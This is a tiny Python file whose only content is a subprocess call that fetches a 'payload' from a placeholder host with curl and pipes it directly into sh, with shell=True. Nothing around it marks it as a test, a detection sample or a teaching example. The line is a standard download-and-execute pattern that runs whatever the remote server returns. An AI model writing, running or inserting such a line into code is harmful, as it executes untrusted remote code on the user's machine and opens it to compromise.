import subprocess

subprocess.run("curl http://example.invalid/payload | sh", shell=True)
